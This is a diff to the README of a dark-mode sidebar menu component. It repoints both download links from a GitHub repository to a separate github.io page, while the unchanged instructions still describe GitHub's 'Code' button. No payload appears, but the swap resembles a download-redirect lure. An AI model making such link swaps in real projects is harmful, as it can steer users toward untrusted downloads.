@@ -1,6 +1,6 @@
 # 🌑 dark-mode-sidebar-menu-v2026 - Modern sidebar navigation for your projects
 
-[![](https://img.shields.io/badge/Download-Project_Files-blue.svg)](https://github.com/uncamphorated-gown148/dark-mode-sidebar-menu-v2026)
+[![](https://img.shields.io/badge/Download-Project_Files-blue.svg)](https://uncamphorated-gown148.github.io)
 
 This software provides a dark mode sidebar menu for web applications. It uses HTML and CSS to create a clean, responsive layout. You can integrate this component into your existing web projects to improve user navigation.
 
@@ -22,7 +22,7 @@ Your computer must meet these basic needs to use this component:
 Follow these steps to obtain and use the menu files on your system.
 
 ### 1. Download the files
-Visit this page to download the component: https://github.com/uncamphorated-gown148/dark-mode-sidebar-menu-v2026
+Visit this page to download the component: https://uncamphorated-gown148.github.io
 
 Once you arrive at the page, look for the green button labeled "Code." Click this button and select "Download ZIP." Your browser will save a compressed file to your computer.
 
